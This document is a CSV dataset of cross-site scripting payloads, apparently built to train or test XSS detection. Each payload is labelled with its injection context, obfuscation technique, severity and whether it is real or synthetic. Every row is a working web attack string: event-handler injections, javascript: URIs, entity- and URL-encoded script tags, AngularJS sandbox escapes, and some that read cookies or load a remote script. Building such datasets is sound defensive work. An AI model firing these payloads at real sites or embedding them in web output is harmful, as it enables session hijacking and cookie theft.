payload,context,technique,severity,length,source
<var onpointermove=alert(1) style=display:block>AnonKryptiQuz</var>,event_handler,none,medium,67,real
%3Cscript%3E/x/console.log(1)%3C/script%3E,script_injection,synthetic,medium,42,synthetic
"<iframe onmouseout=""alert(1)"">AnonKryptiQuz</iframe>",event_handler,none,medium,52,real
"""%3E%3Csvg onbegin=alert(String.fromCharCode(88,83,83))%3E",tag_injection,synthetic,medium,58,synthetic
"';alert(""AnonKryptiQuz"");//",generic,none,medium,27,real
"<dfn onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</dfn>",event_handler,none,medium,66,real
j&#97;vascript:\u0061lert(location.hash),js_uri,synthetic,medium,40,synthetic
"<table oncontextmenu=""alert(1)"">AnonKryptiQuz</table>",event_handler,none,medium,53,real
"<frame draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</frame>",event_handler,none,medium,88,real
<svg on&#101;rror=prompt(docum&#101;nt.cooki&#101;)/>,tag_injection,synthetic,medium,53,synthetic
"<summary oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,100,real
"<style>:target {color:red;}</style><dfn id=x style=""transition:color 1s"" ontransitionstart=alert(1)></dfn>",event_handler,none,medium,106,real
"&#101;v&#97;l(""prompt(loc&#97;tion.h&#97;sh)"")",dom_sink,synthetic,medium,46,synthetic
j&#97;v&#97;script:prompt(docum&#101;nt.cooki&#101;),js_uri,synthetic,medium,52,synthetic
<style onreadystatechange=alert(1)></style>,event_handler,none,medium,43,real
""" onclick=prompt(docum&#101;nt.cooki&#101;) """,attribute_escape,synthetic,medium,45,synthetic
"%22 onfocus=console.log(String.fromCharCode(88,83,83)) autofocus=%22",attribute_escape,synthetic,medium,68,synthetic
<script src=http://yoursite.com/your_files.js></script>,script_injection,none,low,55,real
%27 onload=console.log(%27XSS%27) %27,attribute_escape,synthetic,medium,37,synthetic
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><html id=x style=""position:absolute;"" onanimationcancel=""print()""></html>",event_handler,none,low,177,real
<scRipT>aLerT`lOcaTioN.hAsh`</ScrIpt>,script_injection,synthetic,medium,37,synthetic
%3Cimg%20src%3Dx%20onerror%3D%60alert%28%2FAnonKryptiQuz%2F%29%60%3E,generic,url_encoding,low,68,real
"<dl draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</dl>",event_handler,none,medium,77,real
"<mark draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</mark>",event_handler,none,medium,86,real
<svg onbegin=console.log('XSS')>,tag_injection,synthetic,medium,32,synthetic
"1'""();<AnonKryptiQuz><ScRiPt>alert(""AnonKryptiQuz"")</ScRiPt>",script_injection,case_variation,medium,60,real
"<label onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</label>",event_handler,none,medium,72,real
"<!--<value><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC=""javas<![CDATA[cript:alert('XSS');"">",tag_injection,none,medium,90,real
"guest/msft_a_guest_register.php?_browser=1&title=""><svg/onload=alert(1)>",event_handler,none,medium,72,real
<svG oNloAd=ConSolE.lOg(DocUmeNt.DomAin)>,tag_injection,synthetic,medium,41,synthetic
<strike onpointerover=alert(1) style=display:block>AnonKryptiQuz</strike>,event_handler,none,medium,73,real
"<form onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</form>",event_handler,none,medium,70,real
<svg onmouseenter=alert(location.hash)/>,tag_injection,synthetic,medium,40,synthetic
"<template onmouseover=""alert(1)"">AnonKryptiQuz</template>",event_handler,none,medium,57,real
<video2 onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</video2>,event_handler,none,medium,78,real
javascript:void(console.log('XSS')),js_uri,synthetic,medium,35,synthetic
"""%3E%3Csvg onerror=console.log(String.fromCharCode(88,83,83))%3E",tag_injection,synthetic,medium,64,synthetic
<head onpointerout=alert(1) style=display:block>AnonKryptiQuz</head>,event_handler,none,medium,68,real
"<div draggable=""true"" contenteditable>drag me</div><summary ondrop=alert(1) contenteditable style=display:block>drop here</summary>",event_handler,none,medium,131,real
"<span onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</span>",event_handler,none,medium,67,real
"<meta draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</meta>",event_handler,none,medium,64,real
"<animate onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</animate>",event_handler,none,medium,73,real
<iframe id=x onfocusin=alert(1)>,event_handler,none,medium,32,real
%3Cscript%3Ealert(`AnonKryptiQuz`)%3C/script%3E,generic,url_encoding,medium,47,real
<svg><applet onload=alert(1)></applet>,event_handler,none,medium,38,real
"<command onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</command>",event_handler,none,medium,69,real
<code id=x tabindex=1 onbeforeactivate=alert(1)></code>,event_handler,none,medium,55,real
"""><svg onmous&#101;&#101;nt&#101;r=confirm(docum&#101;nt.cooki&#101;)>",tag_injection,synthetic,medium,70,synthetic
%22><svg onload=alert(document.domain)>,tag_injection,synthetic,medium,39,synthetic
<ol onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,53,real
"<map onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</map>",event_handler,none,medium,67,real
<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>,script_injection,case_variation,medium,39,real
""" onmouseenter=confirm(document.domain) """,attribute_escape,synthetic,medium,41,synthetic
"<svg onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</svg>",event_handler,none,medium,82,real
"<set onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</set>",event_handler,none,medium,67,real
"<svg ontoggl&#101;=prompt(String.fromCh&#97;rCod&#101;(88,83,83))/>",tag_injection,synthetic,medium,67,synthetic
<svg onmouseover=prompt(document.domain)>,tag_injection,synthetic,medium,41,synthetic
"""><img src=x onerror=prompt(document['domain']);>",event_handler,none,medium,49,real
"<slot draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</slot>",event_handler,none,medium,84,real
<svg><dd onload=alert(1)></dd>,event_handler,none,medium,30,real
%3Csvg onfocus=console.log('XSS')/%3E,tag_injection,synthetic,medium,37,synthetic
}</style><script>a=eval;b=alert;a(b(/XSS/.source));</script>,script_injection,none,low,60,real
"<a href=""\xE2\x80\x83javascript:javascript:alert(4112)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,82,real
<svg onload=prompt(document.domain)>,tag_injection,synthetic,medium,36,synthetic
"<figure onmouseup=""alert(1)"">AnonKryptiQuz</figure>",event_handler,none,medium,51,real
"<script src=""javascript:alert(3)""></script> // IE6, O11.01↓, OM10.1↓//[""'`-->]]>]</div>",script_injection,none,medium,87,real
""" onclick=alert(location.hash) """,attribute_escape,synthetic,medium,32,synthetic
<button popovertarget=x>Click me</button><nobr ontoggle=alert(1) popover id=x>AnonKryptiQuz</nobr>,event_handler,none,medium,98,real
"""><Svg onCliCk=ConSolE.lOg(DocUmeNt.DomAin)>",tag_injection,synthetic,medium,44,synthetic
"<time onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</time>",event_handler,none,medium,64,real
%22%3e%3c%5K/onwheel=alert(1)%3emouse%20wheel%20here%3c%21--,event_handler,url_encoding,medium,60,real
<dialog onmousewheel=alert(1) style=display:block>requires scrolling,event_handler,none,medium,68,real
"<meter onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</meter>",event_handler,none,medium,71,real
"<scr	ipt>/*/prompt(String.fromCharCode(88,83,83))</scr	ipt>",script_injection,synthetic,medium,59,synthetic
""" on&#101;rror=confirm(docum&#101;nt.cooki&#101;) """,attribute_escape,synthetic,medium,51,synthetic
javascript&#x00000003A;alert&#x000000028;2&#x000000029;&#x00000003B;,generic,html_entity,low,68,real
"""><Svg onMouSeoVer=coNsoLe.Log(doCumEnt.doMaiN)>",tag_injection,synthetic,medium,48,synthetic
<script>prompt`docum&#101;nt.cooki&#101;`</script>,script_injection,synthetic,medium,50,synthetic
"<style>:target {color: red;}</style><hr id=x style=""transition:color 10s"" ontransitioncancel=print()></hr>",event_handler,none,low,106,real
<svG oNmoUseEntEr=ConSolE.lOg('XSS')/>,tag_injection,synthetic,medium,38,synthetic
"<article draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</article>",event_handler,none,medium,72,real
"<keygen draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</keygen>",event_handler,none,medium,88,real
<svg><q onload=alert(1)></q>,event_handler,none,medium,28,real
"<scr	ipt>console.log`String.fromCharCode(88,83,83)`</scr	ipt>",script_injection,synthetic,medium,61,synthetic
"</script><img/*%00/src=""worksinchrome&colon;prompt(1)""/%00*/onerror='eval(src)'>",event_handler,encoding|comment_injection|url_encoding,high,80,real
"<hr draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</hr>",event_handler,none,medium,82,real
"<script>x=document.createElement(%22iframe%22);x.src=%22http://xssme.html5sec.org/404%22;x.onload=function(){window.frames[0].document.write(%22<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%22)};document.body.appendChild(x);</script>",script_injection,url_encoding,high,353,real
"<option oncut=""alert(1)"" contenteditable>AnonKryptiQuz</option>",event_handler,none,medium,63,real
<bdi id=x tabindex=1 onfocus=alert(1)></bdi>,event_handler,none,medium,44,real
<script onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</script>,script_injection,none,medium,78,real
"<style></style\x0A<img src=""about:blank"" onerror=javascript:alert(5277)//></style>",event_handler,none,medium,82,real
%27 ontoggle=alert(%27XSS%27) %27,attribute_escape,synthetic,medium,33,synthetic
"<div draggable=""true"" contenteditable>drag me</div><nextid ondrop=alert(1) contenteditable style=display:block>drop here</nextid>",event_handler,none,medium,129,real
<scr\uffffipt>alert(0)</script>,generic,unicode_escape,medium,31,real
"<svG/x="">""/oNloaD=confirm()//",event_handler,case_variation,medium,29,real
"<thead oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,99,real
"SetTimEouT(""AleRt('XSS')"",0)",dom_sink,synthetic,medium,28,synthetic
"<video oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</video>",event_handler,none,medium,62,real
' onerror=\u0061lert(1) ',attribute_escape,synthetic,medium,25,synthetic
"<area oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</area>",event_handler,none,medium,60,real
'%27%3E%27%22%3E%3Cscript%3Ealert(2);%3C/script%3E',generic,url_encoding,medium,51,real
<caption id=x tabindex=1 onbeforedeactivate=alert(1)></caption><input autofocus>,event_handler,none,medium,80,real
"<div draggable=""true"" contenteditable>drag me</div><iframe2 ondrop=alert(1) contenteditable style=display:block>drop here</iframe2>",event_handler,none,medium,131,real
"<form id=""test"" /><button form=""test"" formaction=""javascript:javascript:alert(1)"">X",js_uri,none,medium,83,real
<frame onpointerup=alert(1) style=display:block>AnonKryptiQuz</frame>,event_handler,none,medium,69,real
"<style>:target {color:red;}</style><rt id=x style=""transition:color 1s"" ontransitionend=alert(1)></rt>",event_handler,none,medium,102,real
<script>/*/prompt(location.hash)</script>,script_injection,synthetic,medium,41,synthetic
"<hr onmouseout=""alert(1)"">AnonKryptiQuz</hr>",event_handler,none,medium,44,real
<animate onpointerenter=alert(1) style=display:block>AnonKryptiQuz</animate>,event_handler,none,medium,76,real
"<style>@keyframes x{}</style><del style=""animation-name:x"" onanimationend=""alert(1)""></del>",event_handler,none,medium,91,real
"<rb onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</rb>",event_handler,none,medium,64,real
"<tt oncut=""alert(1)"" contenteditable>AnonKryptiQuz</tt>",event_handler,none,medium,55,real
<img srcset=1 onerror=alert(1)>,event_handler,none,medium,31,real
"<body draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</body>",event_handler,none,medium,64,real
&lt;BGSOUND SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;,js_uri,none,medium,66,real
' on&#101;rror=&#97;l&#101;rt(1) ',attribute_escape,synthetic,medium,34,synthetic
"{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()",generic,none,medium,120,real
<map id=x tabindex=1 onfocusin=alert(1)></map>,event_handler,none,medium,46,real
<i onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,52,real
' onclick=\u0061lert(document.cookie) ',attribute_escape,synthetic,medium,39,synthetic
<i id=x tabindex=1 onfocus=alert(1)></i>,event_handler,none,medium,40,real
"/*\""<sVg/oNloAd=alert(document.domain)//>\x3e",event_handler,case_variation,medium,45,real
<iframe id=x tabindex=1 ondeactivate=alert(1)></iframe><input id=y autofocus>,event_handler,none,medium,77,real
<multicol onmousewheel=alert(1) style=display:block>requires scrolling,event_handler,none,medium,70,real
foo?q=foo<script>alert('AnonKryptiQuz')<%2fscript>,script_injection,url_encoding,medium,50,real
"setTimeout(%22alert(document.domain)%22,0)",dom_sink,synthetic,medium,42,synthetic
<svg onbegin=console.log(document.cookie)>,tag_injection,synthetic,medium,42,synthetic
"<caption onmouseup=""alert(1)"">AnonKryptiQuz</caption>",event_handler,none,medium,53,real
<body onpointermove=alert(1) style=display:block>AnonKryptiQuz</body>,event_handler,none,medium,69,real
"<col onclick=""alert(1)"" style=display:block>AnonKryptiQuz</col>",event_handler,none,medium,63,real
<scr<script>ipt>alert(1);</scr</script>ipt>,script_injection,none,medium,43,real
"<;TABLE BACKGROUND="";javascript:alert(';XSS';)"";>;<;/TABLE>;",js_uri,none,medium,60,real
<dir id=x tabindex=1 onbeforeactivate=alert(1)></dir>,event_handler,none,medium,53,real
"docum&#101;nt.writ&#101;(""<img src=x on&#101;rror=confirm(docum&#101;nt.cooki&#101;)>"")",dom_sink,synthetic,medium,87,synthetic
<param onblur=alert(1) tabindex=1 id=x></param><input autofocus>,event_handler,none,medium,64,real
"<p draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</p>",event_handler,none,medium,80,real
%22 onmouseover=alert(document.domain) %22,attribute_escape,synthetic,medium,42,synthetic
"<ins draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</ins>",event_handler,none,medium,64,real
<isindex onblur=alert(1) tabindex=1 id=x></isindex><input autofocus>,event_handler,none,medium,68,real
' onmous&#101;&#101;nt&#101;r=prompt(docum&#101;nt.dom&#97;in) ',attribute_escape,synthetic,medium,64,synthetic
"<style>:target {transform: rotate(180deg);}</style><textarea id=x style=""transition:transform 2s"" ontransitionrun=print()></textarea>",event_handler,none,low,133,real
#<iframe src=javascript:alert(1)>,js_uri,none,medium,33,real
</br style=a:expression(alert(1))>,generic,none,medium,34,real
"<i onmouseover=""alert(1)"">AnonKryptiQuz</i>",event_handler,none,medium,43,real
"<menu oncontextmenu=""alert(1)"">AnonKryptiQuz</menu>",event_handler,none,medium,51,real
"<div onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</div>",event_handler,none,medium,59,real
"<figure ondblclick=""alert(1)"">AnonKryptiQuz</figure>",event_handler,none,medium,52,real
' onmouseover=\u0061lert(document.cookie) ',attribute_escape,synthetic,medium,43,synthetic
<menu onblur=alert(1) tabindex=1 id=x></menu><input autofocus>,event_handler,none,medium,62,real
"<applet draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</applet>",event_handler,none,medium,90,real
"<s draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</s>",event_handler,none,medium,58,real
""" onmous&#101;&#101;nt&#101;r=confirm(docum&#101;nt.dom&#97;in) """,attribute_escape,synthetic,medium,65,synthetic
<svg onclick=prompt(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,medium,43,synthetic
<svg onmouseover=console.log(1)>,tag_injection,synthetic,medium,32,synthetic
"<multicol onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</multicol>",event_handler,none,medium,72,real
"javascript:`/*</title></style></textarea></noscript></script></noembed></template></select/""/'/*--><frame onload=alert()><svg/\""/*<svg onload=' /**/-alert()//'>javascript:/*`/*\""/*'/*</noembed>""/*<frame src=javascript:/**/;alert()//--></title></textarea></style></noscript></template></select></script><<svg/onload= alert()//>",event_handler,comment_injection,medium,326,real
<sub onpointerover=alert(1) style=display:block>AnonKryptiQuz</sub>,event_handler,none,medium,67,real
"<style>:target {transform: rotate(180deg);}</style><del id=x style=""transition:transform 2s"" ontransitionrun=print()></del>",event_handler,none,low,123,real
"docum&#101;nt.writ&#101;(""<img src=x on&#101;rror=prompt('XSS')>"")",dom_sink,synthetic,medium,66,synthetic
{{!ready && (ready = true) && ( !call ? $$watchers[0].get(toString.constructor.prototype) : (a = apply) && (apply = constructor) && (valueOf = call) && (''+''.toString( 'F = Function.prototype;' + 'F.apply = F.a;' + 'delete F.a;' + 'delete F.valueOf;' + 'alert(1);' )));}},template_injection,none,medium,272,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><param id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></param>",event_handler,none,medium,180,real
"<style>@keyframes slidein {}</style><track style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></track>",event_handler,none,medium,164,real
"<img """"""><script>alert(""XSS by \nxss"")</script><marquee><h1>XSS by xss</h1></marquee>",script_injection,none,medium,85,real
<cite id=x tabindex=1 onfocusin=alert(1)></cite>,event_handler,none,medium,48,real
"<p onmouseout=""alert(1)"">AnonKryptiQuz</p>",event_handler,none,medium,42,real
j&#97;vascript:\u0061lert(document.domain),js_uri,synthetic,medium,42,synthetic
"<link onmouseleave=""alert(1)"">AnonKryptiQuz</link>",event_handler,none,medium,50,real
"&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(\""AnonKryptiQuz\"");&lt;/SCRIPT&gt;",generic,none,medium,68,real
"<dd oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</dd>",event_handler,none,medium,67,real
"<a href=""javas\x08cript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,71,real
"<listing onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</listing>",event_handler,none,medium,75,real
"<details open ontoggle='self[""ale""%2b""rt""]&lpar;document&period;domain&rpar;'>",event_handler,url_encoding,low,78,real
"<header onmouseleave=""alert(1)"">AnonKryptiQuz</header>",event_handler,none,medium,54,real
"&lt;BODY BACKGROUND=\""javascript&#058;alert('XSS')\""&gt;",generic,html_entity,medium,56,real
"<link onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></link>",event_handler,none,medium,281,real
"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm()>",tag_injection,case_variation,medium,48,real
"<picture oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</picture>",event_handler,none,medium,66,real
"<IMG SRC=x ononline=""alert(String.fromCharCode(88,83,83))"">",event_handler,encoding|case_variation,medium,59,real
"<noscript><p title=""</noscript><img src=x onerror=alert(1)>"">",event_handler,none,medium,61,real
"<bgsound onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</bgsound>",event_handler,none,medium,71,real
"<noscript onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</noscript>",event_handler,none,medium,73,real
"<nextid oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</nextid>",event_handler,none,medium,64,real
"<pre draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</pre>",event_handler,none,medium,64,real
javascript:void(prompt(1)),js_uri,synthetic,medium,26,synthetic
"<select oncontextmenu=""alert(1)"">AnonKryptiQuz</select>",event_handler,none,medium,55,real
"<style>@keyframes slidein {}</style><tt style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></tt>",event_handler,none,medium,158,real
<;IMG SRC=javascript:alert(';XSS';)>;,js_uri,none,medium,37,real
"<img src=x\x11onerror=""javascript:alert(1)"">",event_handler,none,medium,44,real
""" onmouseover=console.log(location.hash) """,attribute_escape,synthetic,medium,42,synthetic
"<style>@keyframes x{}</style><pre style=""animation-name:x"" onanimationstart=""alert(1)""></pre>",event_handler,none,medium,93,real
"<style>@keyframes slidein {}</style><fieldset style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></fieldset>",event_handler,none,medium,176,real
%22><svg ontoggle=alert(%27XSS%27)>,tag_injection,synthetic,medium,35,synthetic
